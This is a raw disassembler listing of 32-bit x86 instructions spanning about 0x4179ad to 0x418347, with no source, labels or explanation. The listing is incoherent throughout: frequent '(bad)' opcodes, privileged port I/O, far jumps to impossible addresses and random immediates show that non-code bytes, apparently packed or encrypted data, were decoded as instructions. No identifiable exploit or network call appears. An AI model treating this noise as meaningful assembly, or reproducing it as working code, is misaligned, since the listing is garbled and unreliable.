  4179ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179ae:	jbe    0x4179c8
  4179b0:	mov    bh,0x6c
  4179b2:	into   
  4179b3:	push   ebx
  4179b4:	(bad)  
  4179b6:	sti    
  4179b7:	stos   BYTE PTR es:[edi],al
  4179b8:	lods   eax,DWORD PTR ds:[esi]
  4179b9:	mov    al,0xf9
  4179bb:	daa    
  4179bc:	mov    ebp,0xa20c6aaa
  4179c1:	jne    0x417a05
  4179c3:	adc    al,0x6f
  4179c5:	and    ah,cl
  4179c7:	cmp    BYTE PTR [ebx+eax*4],cl
  4179ca:	arpl   WORD PTR [eax-0x9136640],cx
  4179d0:	loopne 0x417986
  4179d2:	add    DWORD PTR [ebx],edx
  4179d4:	dec    esp
  4179d5:	mov    fs,WORD PTR [edi]
  4179d7:	and    cl,BYTE PTR [edi]
  4179d9:	int    0xd1
  4179db:	pop    es
  4179dc:	sbb    eax,0xabe0479c
  4179e1:	or     eax,0x89bb830e
  4179e6:	push   esi
  4179e7:	add    al,0x52
  4179e9:	xchg   ebp,eax
  4179ea:	test   eax,0xb074d837
  4179ef:	xor    al,0x5f
  4179f1:	test   bh,al
  4179f3:	das    
  4179f4:	nop
  4179f5:	(bad)  
  4179f6:	push   DWORD PTR [eax+0x7e2711f4]
  4179fc:	xchg   edi,eax
  4179fd:	xor    BYTE PTR [ebp+0x2e],0x18
  417a01:	test   BYTE PTR [esi],cl
  417a03:	retf   
  417a04:	loope  0x417988
  417a06:	rcl    BYTE PTR [edx],1
  417a08:	sahf   
  417a09:	loop   0x417a78
  417a0b:	and    BYTE PTR [ebx-0x618ae492],bh
  417a11:	xchg   ebx,eax
  417a12:	xor    al,0x6a
  417a14:	mov    ds:0xe378fb72,al
  417a19:	and    bl,al
  417a1b:	push   edi
  417a1c:	inc    edi
  417a1d:	js     0x417a74
  417a1f:	dec    ecx
  417a20:	cld    
  417a21:	rep stos BYTE PTR es:[edi],al
  417a23:	adc    esp,edx
  417a25:	lods   eax,DWORD PTR ds:[esi]
  417a26:	frndint 
  417a28:	xchg   esp,eax
  417a29:	xchg   BYTE PTR [ebx],dh
  417a2b:	sub    al,BYTE PTR [ebx+0x42]
  417a2e:	fwait
  417a2f:	or     ebp,esp
  417a31:	js     0x417a6e
  417a33:	jecxz  0x4179cc
  417a35:	sar    BYTE PTR [ecx],1
  417a37:	xchg   esi,eax
  417a38:	xchg   ecx,eax
  417a39:	push   ebp
  417a3a:	lds    edx,FWORD PTR [ecx]
  417a3c:	(bad)  
  417a3d:	ins    DWORD PTR es:[edi],dx
  417a3e:	shl    DWORD PTR [edx+edi*4+0xeca25ec],1
  417a45:	outs   dx,DWORD PTR ds:[esi]
  417a46:	call   0x8ef6161f
  417a4b:	inc    esi
  417a4c:	mov    dh,BYTE PTR [ecx]
  417a4e:	imul   edi,ebp,0xffffffc0
  417a51:	or     al,0xcc
  417a53:	sbb    ebx,ebx
  417a55:	(bad)  
  417a56:	and    eax,0xddbcab3b
  417a5b:	shr    DWORD PTR [eax],1
  417a5d:	pop    ebp
  417a5e:	std    
  417a5f:	retf   0x7007
  417a62:	sub    dl,BYTE PTR [eax+0x1a]
  417a65:	ret    
  417a66:	or     eax,0xa531805b
  417a6b:	and    BYTE PTR [eax+0x1b2479f4],ah
  417a71:	ret    
  417a72:	es mov al,0x99
  417a75:	ret    
  417a76:	mul    edx
  417a78:	mov    WORD PTR [edx],fs
  417a7a:	inc    ebp
  417a7b:	ret    
  417a7c:	outs   dx,DWORD PTR ds:[esi]
  417a7d:	push   ebp
  417a7e:	les    edi,FWORD PTR [ebp-0x24521a59]
  417a84:	xlat   BYTE PTR ds:[ebx]
  417a85:	jge    0x417aa4
  417a87:	call   0xb4a7a205
  417a8c:	int3   
  417a8d:	xor    BYTE PTR [edi+0x7458],ah
	...
  417af3:	add    BYTE PTR [edi],ch
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx+0x2ba9bf14]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0xd3000001
  417b0d:	sub    DWORD PTR [edi],edx
  417b0f:	mov    ebx,0x81105578
  417b14:	paddd  mm4,mm3
  417b17:	dec    ecx
  417b18:	(bad)  
  417b19:	(bad)  
  417b1b:	pop    ebx
  417b1c:	int3   
  417b1d:	int3   
  417b1e:	fld    DWORD PTR [edx-0x52]
  417b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b22:	mov    esi,0xf971852e
  417b27:	or     eax,0xd04e28ef
  417b2c:	mov    WORD PTR es:[ebx],ds
  417b2f:	mov    dl,0xb3
  417b31:	sbb    ah,BYTE PTR [edi+0x4c]
  417b34:	cmovnp eax,DWORD PTR [edx+edi*1]
  417b38:	cmc    
  417b39:	adc    ebp,DWORD PTR [eax+0x28bbc1a5]
  417b3f:	pop    esi
  417b40:	popa   
  417b41:	xchg   BYTE PTR [ebx-0x7b],dl
  417b44:	jbe    0x417afb
  417b46:	into   
  417b47:	cmc    
  417b48:	cmp    BYTE PTR [edx-0xa9235c4],0x1
  417b4f:	xlat   BYTE PTR ds:[ebx]
  417b50:	pop    esi
  417b51:	push   ecx
  417b52:	inc    ebp
  417b53:	popa   
  417b54:	adc    BYTE PTR [eax-0xb],0xf6
  417b58:	adc    BYTE PTR [edx-0x5f],ah
  417b5b:	stc    
  417b5c:	mov    ebp,0x91f19838
  417b61:	dec    esi
  417b62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b63:	push   ebx
  417b64:	daa    
  417b65:	fsubrp st(3),st
  417b67:	ds out dx,al
  417b69:	or     cl,dl
  417b6b:	inc    edx
  417b6c:	pop    ss
  417b6d:	imul   esi,DWORD PTR [ebx+0x0],0x223dfb09
  417b74:	pop    ss
  417b75:	xchg   dl,al
  417b77:	outs   dx,DWORD PTR ds:[esi]
  417b78:	adc    eax,0xe5292a8f
  417b7d:	jmp    0xbab96b09
  417b82:	loop   0x417bed
  417b84:	xor    DWORD PTR [esi],0x71b7f74c
  417b8a:	push   ebx
  417b8b:	lods   eax,DWORD PTR ds:[esi]
  417b8c:	test   BYTE PTR [ecx],dh
  417b8e:	cmp    al,ch
  417b90:	mov    edx,0xab076d8a
  417b95:	jo     0x417b44
  417b97:	call   0x6e45:0x29c0966d
  417b9e:	push   edx
  417b9f:	arpl   sp,bp
  417ba1:	mov    es,WORD PTR [eax-0x12e67eef]
  417ba7:	add    esi,0xffffffc5
  417baa:	or     eax,0xe6a8a980
  417baf:	cdq    
  417bb0:	add    ebx,edi
  417bb2:	(bad)  
  417bb3:	sar    DWORD PTR [ebx],0x88
  417bb6:	mov    ch,0x2e
  417bb8:	loop   0x417bed
  417bba:	jmp    0x417bec
  417bbc:	mov    ds:0xbe8845e4,al
  417bc1:	cmp    eax,0x5e9ccd5d
  417bc6:	mov    eax,ds:0xe1f57560
  417bcb:	push   edi
  417bcc:	mov    ds:0x9907dee1,al
  417bd1:	xor    BYTE PTR ds:[ebx],al
  417bd4:	js     0x417c2e
  417bd6:	popa   
  417bd7:	sbb    eax,0xe24e5ff8
  417bdc:	inc    esi
  417bdd:	and    al,0xa5
  417bdf:	ret    0x50ce
  417be2:	das    
  417be3:	sub    al,BYTE PTR [edi-0x7b]
  417be6:	gs loop 0x417b7e
  417be9:	or     bl,BYTE PTR [edi-0x4478301b]
  417bef:	add    eax,0xdb39c38
  417bf4:	pop    esp
  417bf5:	mov    WORD PTR [edi],?
  417bf7:	(bad)  
  417bf8:	ss mov ebp,0x2c0c7281
  417bfe:	mov    bl,0xb
  417c00:	test   eax,0x160cea27
  417c06:	sub    bl,0xff
  417c09:	dec    eax
  417c0a:	adc    eax,0xc3f3a709
  417c0f:	or     eax,0xb5
	...
  417c74:	mov    eax,eax
  417c76:	nop
  417c77:	test   cl,bl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x5d
  417c81:	mov    esp,DWORD PTR [edi+0x15]
  417c84:	test   eax,0x50000fb
  417c89:	add    DWORD PTR [eax],eax
  417c8b:	add    BYTE PTR [eax],ah
  417c8d:	fdiv   st(7),st
  417c8f:	shl    DWORD PTR [edi+0x5c98a5ab],1
  417c95:	pop    edi
  417c96:	adc    eax,DWORD PTR [ecx+0x61a07b8]
  417c9c:	mov    DWORD PTR [ecx+0x16ab2b4a],0x60f9205d
  417ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ca7:	sahf   
  417ca8:	pop    ebp
  417ca9:	jb     0x417c84
  417cab:	sbb    DWORD PTR [eax],0x54
  417cae:	or     al,0x6f
  417cb0:	shl    BYTE PTR [ebp+ecx*1-0x704185bb],1
  417cb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cb8:	cmc    
  417cb9:	push   ds
  417cba:	lahf   
  417cbb:	inc    ebx
  417cbc:	icebp  
  417cbd:	push   ds
  417cbe:	int3   
  417cbf:	and    eax,0x5e5626a4
  417cc4:	clc    
  417cc5:	test   DWORD PTR [edx-0x71],ecx
  417cc8:	push   es
  417cc9:	jnp    0x417cad
  417ccb:	mov    WORD PTR [ebp+0x35],es
  417cce:	adc    eax,esi
  417cd0:	mov    cl,0x4
  417cd2:	xchg   esi,eax
  417cd3:	xor    DWORD PTR [edx+edx*4-0x7a],ecx
  417cd7:	lds    edi,FWORD PTR [ecx-0x581e2efe]
  417cdd:	cld    
  417cde:	mov    bl,BYTE PTR [edi-0x4a16cf4b]
  417ce4:	cs sub eax,0x82a6f1d1
  417cea:	mov    ebp,DWORD PTR ds:0xa8606e33
  417cf0:	pop    ebp
  417cf1:	fimul  DWORD PTR [edx+0x4f]
  417cf4:	(bad)  
  417cf5:	cwde   
  417cf6:	pop    eax
  417cf7:	pop    eax
  417cf8:	ret    0xdba3
  417cfb:	scas   eax,DWORD PTR es:[edi]
  417cfc:	dec    esi
  417cfd:	cli    
  417cfe:	pop    ss
  417cff:	nop
  417d00:	pop    esp
  417d01:	pop    ebp
  417d02:	xchg   esp,eax
  417d03:	mov    ch,0xad
  417d05:	or     eax,0xdac68aa1
  417d0a:	cmp    ah,dl
  417d0c:	or     dl,BYTE PTR [eax]
  417d0e:	fld    DWORD PTR [eax+0x3dbc53c]
  417d14:	test   DWORD PTR [esi],ecx
  417d16:	pop    ebp
  417d17:	pusha  
  417d18:	ret    0xf8f2
  417d1b:	sbb    DWORD PTR [edx-0x6deb6be6],edx
  417d21:	test   esi,ecx
  417d23:	or     eax,0xf8c7b46a
  417d28:	mov    DWORD PTR [eax],esi
  417d2a:	jmp    0x35a84ede
  417d2f:	jne    0x417d97
  417d31:	mov    DWORD PTR [ecx+edx*8],ecx
  417d34:	xchg   esp,eax
  417d35:	sbb    ebp,DWORD PTR [edx+0x29]
  417d38:	jle    0x417cc0
  417d3a:	inc    esi
  417d3b:	pop    esi
  417d3c:	popf   
  417d3d:	scas   eax,DWORD PTR es:[edi]
  417d3e:	pop    esi
  417d3f:	xor    dl,BYTE PTR [edi+0x25]
  417d42:	fmul   DWORD PTR [esi]
  417d44:	xchg   edx,eax
  417d45:	retf   
  417d46:	or     ah,BYTE PTR ds:0x42ed7b4d
  417d4c:	and    DWORD PTR [ebp-0x54987e26],esi
  417d52:	xor    bh,cl
  417d54:	jno    0x417dc5
  417d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d57:	ror    BYTE PTR ds:0x4ffcff3e,0xde
  417d5e:	add    al,0xd9
  417d60:	outs   dx,BYTE PTR ds:[esi]
  417d61:	and    ch,BYTE PTR [esi+ecx*2]
  417d64:	je     0x417d8f
  417d66:	jge    0x417dc2
  417d68:	or     DWORD PTR [esi],0xffffffe8
  417d6b:	mov    cl,0x18
  417d6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d6e:	ret    0x6b05
  417d71:	and    al,0x4d
  417d73:	arpl   WORD PTR [edi-0x7a],si
  417d76:	mov    edx,0x524b13c2
  417d7b:	fisttp WORD PTR [edi+ebp*8-0x59]
  417d7f:	cmp    ch,bl
  417d81:	retf   
  417d82:	jmp    0xf930:0xc2f0291c
  417d89:	(bad)  
  417d8a:	or     eax,0xebe0fc24
  417d8f:	and    ah,al
	...
  417df1:	add    BYTE PTR [eax],al
  417df3:	add    BYTE PTR [edi],dl
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	push   ss
  417e01:	mov    bh,0xb5
  417e03:	ja     0x417db3
  417e05:	cld    
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    eax,0x1f000001
  417e0d:	cmp    al,0x86
  417e0f:	int    0x30
  417e11:	(bad)  
  417e12:	clc    
  417e13:	and    eax,0x11670e9
  417e18:	lahf   
  417e19:	xchg   edx,eax
  417e1a:	cmp    dh,dl
  417e1c:	mov    ah,0x72
  417e1e:	sbb    ecx,edi
  417e20:	jb     0x417e20
  417e22:	sbb    al,ch
  417e24:	hlt    
  417e25:	data16 jmp 0x417e4e
  417e28:	add    eax,0x12c54d55
  417e2d:	mov    ah,0xf
  417e2f:	mov    ecx,0xd8a4de8a
  417e34:	mov    dl,0xe0
  417e36:	out    dx,al
  417e37:	dec    ebx
  417e38:	out    dx,al
  417e39:	pushf  
  417e3a:	xchg   ebx,eax
  417e3b:	in     eax,0xfb
  417e3d:	or     BYTE PTR [edx+0x19],dl
  417e40:	jns    0x417de5
  417e42:	in     al,0xf
  417e44:	mov    al,0x14
  417e46:	cdq    
  417e47:	and    ebx,edi
  417e49:	test   DWORD PTR [ecx+0x4c],ebx
  417e4c:	jl     0x417e0a
  417e4e:	mov    WORD PTR [ebx+0x4c],cs
  417e51:	loop   0x417e43
  417e53:	cmp    DWORD PTR [ecx],eax
  417e55:	icebp  
  417e56:	mov    al,0xbd
  417e58:	mov    al,ds:0xc806aa53
  417e5d:	mov    bh,0xa4
  417e5f:	mov    eax,ds:0x414d7f59
  417e64:	mov    edi,DWORD PTR [edi-0x5b05093e]
  417e6a:	sub    BYTE PTR [esi],0x1b
  417e6d:	cld    
  417e6e:	xchg   ebx,eax
  417e6f:	addr16 dec ebp
  417e71:	loop   0x417ec4
  417e73:	xor    ebx,DWORD PTR [eax-0x7f]
  417e76:	das    
  417e77:	xor    bl,ch
  417e79:	(bad)  
  417e7a:	(bad)  
  417e7b:	sbb    al,0xfb
  417e7d:	ins    BYTE PTR es:[edi],dx
  417e7e:	pop    ebp
  417e7f:	int3   
  417e80:	add    BYTE PTR [ebx-0x530cb945],ch
  417e86:	in     eax,0xe4
  417e88:	sub    al,0xf8
  417e8a:	adc    BYTE PTR [ecx+0x25af2d9f],al
  417e90:	outs   dx,BYTE PTR ds:[esi]
  417e91:	jne    0x417ef8
  417e93:	or     DWORD PTR [esi-0x47],ebx
  417e96:	pop    es
  417e97:	ja     0x417e86
  417e99:	test   BYTE PTR ds:0x84ecd5ad,ah
  417e9f:	pop    esi
  417ea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ea1:	inc    edi
  417ea2:	inc    edi
  417ea3:	pop    edi
  417ea4:	pop    ecx
  417ea5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ea6:	mov    ch,0x8f
  417ea8:	dec    ebx
  417ea9:	das    
  417eaa:	psubb  mm7,QWORD PTR [edi+eax*2]
  417eae:	retf   
  417eaf:	dec    edi
  417eb0:	out    0x1d,al
  417eb2:	cli    
  417eb3:	(bad)  
  417eb4:	mov    eax,0xd7cfb07f
  417eb9:	mov    esp,DWORD PTR [edx]
  417ebb:	imul   edi,DWORD PTR [esi*2+0x4ae3803e],0x26
  417ec3:	adc    bh,0x4d
  417ec6:	xor    edx,DWORD PTR ds:0xfc9a9191
  417ecc:	pop    ds
  417ecd:	add    cl,BYTE PTR [edx-0x51053db9]
  417ed3:	sub    al,0xb9
  417ed5:	push   esp
  417ed6:	cmp    ebp,DWORD PTR [edx-0x61]
  417ed9:	push   ecx
  417eda:	or     esp,ebp
  417edc:	fidiv  DWORD PTR [eax]
  417ede:	jmp    0x417f5f
  417ee0:	cmp    bh,bl
  417ee2:	mov    dl,0x3f
  417ee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ee5:	adc    DWORD PTR [edx+0x5a],edi
  417ee8:	(bad)  
  417ee9:	out    0x48,eax
  417eeb:	jmp    0x58d0ea24
  417ef0:	dec    ecx
  417ef1:	iret   
  417ef2:	xor    al,0x16
  417ef4:	mov    esp,0x9fc897a
  417ef9:	leave  
  417efa:	xor    eax,0xa6080185
  417eff:	stos   DWORD PTR es:[edi],eax
  417f00:	mov    eax,0x1d334c38
  417f05:	dec    esi
  417f06:	leave  
  417f07:	repnz (bad) 
  417f09:	adc    al,0x26
  417f0b:	les    ebx,FWORD PTR [esi-0x60cc62fb]
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	mov    ebx,0xb3bf511f
  417f85:	std    
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    eax,0x5b000001
  417f8d:	inc    edi
  417f8e:	push   es
  417f8f:	add    BYTE PTR [ebx+0x54],dl
  417f92:	pop    ebx
  417f93:	dec    edi
  417f94:	sbb    BYTE PTR [edx+esi*2-0x30],cl
  417f98:	jbe    0x417fdc
  417f9a:	mov    ?,esp
  417f9c:	cmp    ah,BYTE PTR [esi]
  417f9e:	xchg   esp,eax
  417f9f:	xchg   ebx,eax
  417fa0:	cmp    DWORD PTR ds:[edx],ebp
  417fa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fa4:	iret   
  417fa5:	punpckhwd mm7,QWORD PTR [ebx-0x47]
  417fa9:	out    dx,eax
  417faa:	ficomp DWORD PTR [edi-0x4c5d9dc8]
  417fb0:	and    bh,BYTE PTR [esi+0x382413c1]
  417fb6:	addr16 (bad) 
  417fb8:	dec    esp
  417fb9:	pop    eax
  417fba:	das    
  417fbb:	mov    ebp,0xa5284a08
  417fc0:	rcr    BYTE PTR [ecx-0x4b7e1f26],1
  417fc6:	xor    DWORD PTR [edi+0x6f96bcd8],0x24
  417fcd:	or     DWORD PTR [ebx],ebp
  417fcf:	lock jle 0x417fba
  417fd2:	cmp    esp,edi
  417fd4:	mov    ch,0x3d
  417fd6:	dec    edx
  417fd7:	cmp    BYTE PTR [edx-0x4e5cb816],dh
  417fdd:	fist   DWORD PTR [edx]
  417fdf:	retf   0x773f
  417fe2:	pop    eax
  417fe3:	push   edx
  417fe4:	shl    WORD PTR [esi+0x32],1
  417fe8:	jmp    0x417fa2
  417fea:	pop    edx
  417feb:	mov    dh,0xd9
  417fed:	out    dx,al
  417fee:	dec    edi
  417fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ff0:	jae    0x41805d
  417ff2:	sbb    BYTE PTR [esi+ebp*8+0x4f],bl
  417ff6:	bound  esi,QWORD PTR [edx]
  417ff8:	mov    WORD PTR [edi-0x5d4bb964],gs
  417ffe:	rol    DWORD PTR [eax+0x66],cl
  418001:	push   0x7cbd8206
  418006:	jmp    0x6a4eee8a
  41800b:	in     eax,dx
  41800c:	push   esp
  41800d:	out    0x7f,eax
  41800f:	mov    ah,0x90
  418011:	xlat   BYTE PTR ds:[ebx]
  418012:	inc    edi
  418013:	add    cx,WORD PTR [ecx+0x77]
  418017:	sahf   
  418018:	mov    ds:0x569b9023,al
  41801d:	adc    ebx,DWORD PTR [esi]
  41801f:	fmul   DWORD PTR [edi-0x53]
  418022:	and    al,0xf4
  418024:	adc    al,0x2a
  418026:	xchg   BYTE PTR [eax+ecx*4],cl
  418029:	mov    DWORD PTR [edi],edx
  41802b:	dec    ecx
  41802c:	lods   al,BYTE PTR ds:[esi]
  41802d:	push   cs
  41802e:	sub    BYTE PTR [edi-0x401b4c40],bh
  418034:	lahf   
  418035:	cdq    
  418036:	mov    edx,0xf9d613a9
  41803b:	retf   
  41803c:	and    BYTE PTR [ecx-0x19],dl
  41803f:	xor    al,0x60
  418041:	mov    bl,0xf
  418043:	test   al,dh
  418045:	cld    
  418046:	jecxz  0x418045
  418048:	shl    BYTE PTR [eax+eax*8],1
  41804b:	repnz xchg ecx,eax
  41804d:	sub    al,0x77
  41804f:	outs   dx,BYTE PTR ds:[esi]
  418050:	and    BYTE PTR [edi+0x20335d97],0xba
  418057:	test   ah,ch
  418059:	jo     0x4180ae
  41805b:	push   edi
  41805c:	jo     0x418068
  41805e:	mov    bl,0x4a
  418060:	dec    ebx
  418061:	inc    edi
  418062:	push   edx
  418063:	or     ecx,ebx
  418065:	std    
  418066:	jecxz  0x417ff3
  418068:	push   eax
  418069:	aad    0xdd
  41806b:	dec    ebp
  41806c:	inc    cl
  41806e:	add    bh,dh
  418070:	outs   dx,DWORD PTR ds:[esi]
  418071:	test   al,0xd2
  418073:	loop   0x4180e3
  418075:	das    
  418076:	mov    ds,WORD PTR [ebp+0x42]
  418079:	mov    bh,0x61
  41807b:	dec    ecx
  41807c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41807d:	mov    al,ds:0xf6271e17
  418082:	jno    0x41803d
  418084:	pusha  
  418085:	mov    bl,bh
  418087:	jge    0x4180b1
  418089:	xchg   bh,dl
  41808b:	sbb    DWORD PTR [ecx+0x18],0x6e
  41808f:	aas    
  418090:	rol    DWORD PTR [eax],0x0
	...
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x8e2fdebc,eax
  418101:	out    0x85,al
  418103:	bound  edi,QWORD PTR [eax+0x50000fe]
  418109:	add    DWORD PTR [eax],eax
  41810b:	add    BYTE PTR [edi-0x6c],ah
  41810e:	mov    esi,0x54b419ac
  418113:	sti    
  418114:	mov    dl,ch
  418116:	ror    BYTE PTR [edi+0x55],cl
  418119:	pop    ebp
  41811a:	test   BYTE PTR [ebx-0x75a46e85],ah
  418120:	iret   
  418121:	jne    0x418172
  418123:	inc    esp
  418124:	jae    0x4180ae
  418126:	pop    ds
  418127:	adc    dl,BYTE PTR [ebp+0x5f]
  41812a:	pop    esp
  41812b:	hlt    
  41812c:	(bad)  
  41812d:	addr16 jle 0x418155
  418130:	add    al,dh
  418132:	daa    
  418133:	addr16 jns 0x4180fd
  418136:	or     ebp,eax
  418138:	test   DWORD PTR [eax+0x7c5d5f4a],esp
  41813e:	xchg   BYTE PTR [edi+0x6c],ah
  418141:	and    al,0x3f
  418143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418144:	(bad)  
  418145:	jns    0x4180ec
  418147:	mov    BYTE PTR [eax+0x37],ch
  41814a:	ficomp DWORD PTR [edx]
  41814c:	ja     0x418125
  41814e:	xchg   DWORD PTR [ecx],edi
  418150:	jae    0x4181bb
  418152:	test   BYTE PTR [ebx],ch
  418154:	test   ah,ch
  418156:	inc    ebp
  418157:	mov    esi,0x65d25ccd
  41815c:	mov    ecx,DWORD PTR [esi+eax*1]
  41815f:	add    ecx,DWORD PTR [esi+0x44a4488c]
  418165:	push   eax
  418166:	adc    BYTE PTR [eax-0x50],ch
  418169:	mov    ds:0xc295d35b,al
  41816e:	and    BYTE PTR [ebx],dh
  418170:	xchg   ebx,eax
  418171:	xchg   ebx,eax
  418172:	fsub   st,st(1)
  418174:	push   esi
  418175:	jecxz  0x41813f
  418177:	pop    edi
  418178:	push   es
  418179:	xchg   ebx,eax
  41817a:	sbb    al,0x42
  41817c:	ret    
  41817d:	imul   edi,DWORD PTR [esi-0x44],0x6c2b80a3
  418184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418185:	inc    ebx
  418186:	jg     0x41817a
  418188:	mov    ch,0x28
  41818a:	inc    esp
  41818b:	add    ecx,esi
  41818d:	icebp  
  41818e:	mov    al,ds:0x5067554e
  418193:	mov    esi,0xfeb54276
  418198:	je     0x418210
  41819a:	add    edi,DWORD PTR [edx+esi*2]
  41819d:	adc    eax,0x9929781d
  4181a2:	xchg   ecx,eax
  4181a3:	icebp  
  4181a4:	ss mov ebx,0xa72abb07
  4181aa:	jg     0x41817a
  4181ac:	push   cs
  4181ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181ae:	xor    edi,edx
  4181b0:	push   0xffffff9a
  4181b2:	sbb    al,bh
  4181b4:	pop    ebx
  4181b5:	pop    edx
  4181b6:	adc    ebp,DWORD PTR [eax+0x4a]
  4181b9:	lahf   
  4181ba:	ins    BYTE PTR es:[edi],dx
  4181bb:	sub    edi,DWORD PTR [edx]
  4181bd:	mov    dh,BYTE PTR [ebx+eax*2+0x30]
  4181c1:	mov    ecx,0x46f8b882
  4181c6:	cmp    DWORD PTR [esi+0x62],ebp
  4181c9:	inc    esp
  4181ca:	repnz mov ch,0x1d
  4181cd:	imul   edx,DWORD PTR [ebp-0x2e081883],0xd0d69633
  4181d7:	xor    al,0xec
  4181d9:	sub    al,0x37
  4181db:	stos   DWORD PTR es:[edi],eax
  4181dc:	xor    eax,0xbff7cbd2
  4181e1:	mov    eax,ds:0xa06a5d1b
  4181e6:	jg     0x418259
  4181e8:	push   es
  4181e9:	add    ebp,esp
  4181eb:	fnstcw WORD PTR [ecx]
  4181ed:	jp     0x4181f1
  4181ef:	test   al,0x1d
  4181f1:	mov    ebx,0x498f1d1c
  4181f6:	adc    eax,DWORD PTR [eax-0x65]
  4181f9:	jmp    DWORD PTR [ecx-0x6d]
  4181fc:	mov    bl,BYTE PTR [ebp-0x12]
  4181ff:	repz jle 0x418270
  418202:	pop    DWORD PTR [edx]
  418204:	cli    
  418205:	loope  0x41822d
  418207:	(bad)  ds:0xc723c37a
  41820d:	xchg   edx,eax
  41820e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41820f:	daa    
  418210:	jmp    0x0:0x0
	...
  418273:	add    BYTE PTR [edi],dh
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x46aeb8d6
  418282:	hlt    
  418283:	stos   DWORD PTR es:[edi],eax
  418284:	mov    ebp,0x50000ff
  418289:	add    DWORD PTR [eax],eax
  41828b:	add    BYTE PTR [ebx],bh
  41828d:	jecxz  0x41823e
  41828f:	or     BYTE PTR [eax+0x66645830],al
  418295:	adc    ebp,ebp
  418297:	test   BYTE PTR [edx],dh
  418299:	clc    
  41829a:	loope  0x4182db
  41829c:	js     0x4182a2
  41829e:	ds (bad) 
  4182a0:	idiv   DWORD PTR [esi+edi*1-0x7fc28024]
  4182a7:	pop    edx
  4182a8:	cs cli 
  4182aa:	xor    al,dh
  4182ac:	sbb    ecx,DWORD PTR [edx]
  4182ae:	rol    DWORD PTR [edi+eiz*8-0x2ed9f9e],1
  4182b5:	add    DWORD PTR [edx],ebx
  4182b7:	fadd   DWORD PTR [edi+0x38907032]
  4182bd:	fild   QWORD PTR [edi-0x54dc6dee]
  4182c3:	std    
  4182c4:	lods   eax,DWORD PTR ds:[esi]
  4182c5:	adc    BYTE PTR [ebx-0x5],ch
  4182c8:	je     0x418299
  4182ca:	shl    BYTE PTR [eax+0x20],0xd3
  4182ce:	xchg   edi,eax
  4182cf:	(bad)  
  4182d0:	outs   dx,DWORD PTR ds:[esi]
  4182d1:	into   
  4182d2:	mov    dl,0xfc
  4182d4:	retf   
  4182d5:	je     0x41827b
  4182d7:	lea    eax,[ebx-0x64c4dba9]
  4182dd:	adc    cl,bl
  4182df:	(bad)  
  4182e0:	pop    eax
  4182e1:	fsubr  QWORD PTR [ecx-0x48]
  4182e4:	imul   eax,DWORD PTR [ecx+0x2a],0xffffffb4
  4182e8:	push   eax
  4182e9:	add    al,0xd
  4182eb:	mov    eax,0x433109db
  4182f0:	repz inc edx
  4182f2:	pusha  
  4182f3:	loopne 0x4182d4
  4182f5:	mov    esi,0xa4bfb809
  4182fa:	mov    ds:0xa380969f,al
  4182ff:	adc    DWORD PTR ds:0x7064ca32,edx
  418305:	xor    bl,0x8
  418308:	(bad)  
  418309:	test   eax,0x2fc3cdb4
  41830e:	jmp    0x418344
  418310:	mov    al,BYTE PTR [ebx]
  418312:	push   eax
  418313:	push   edx
  418314:	scas   eax,DWORD PTR es:[edi]
  418315:	in     al,0xae
  418317:	sbb    al,0xe6
  418319:	sbb    eax,0xa5101550
  41831e:	jbe    0x41836f
  418320:	fwait
  418321:	sub    eax,0xb2256fbe
  418326:	and    BYTE PTR fs:[edx],bl
  418329:	iret   
  41832a:	(bad)  
  41832c:	into   
  41832d:	outs   dx,DWORD PTR ds:[esi]
  41832e:	lods   al,BYTE PTR ds:[esi]
  41832f:	xchg   ebx,eax
  418330:	push   esp
  418331:	repnz addr16 pop ecx
  418334:	push   edi
  418335:	ja     0x41832f
  418337:	hlt    
  418338:	sub    esp,edx
  41833a:	push   esp
  41833b:	jnp    0x4182d8
  41833d:	dec    ebp
  41833e:	fistp  WORD PTR [eax-0x47]
  418341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418342:	sub    eax,0xcd0b5283
  418347:	push   esp
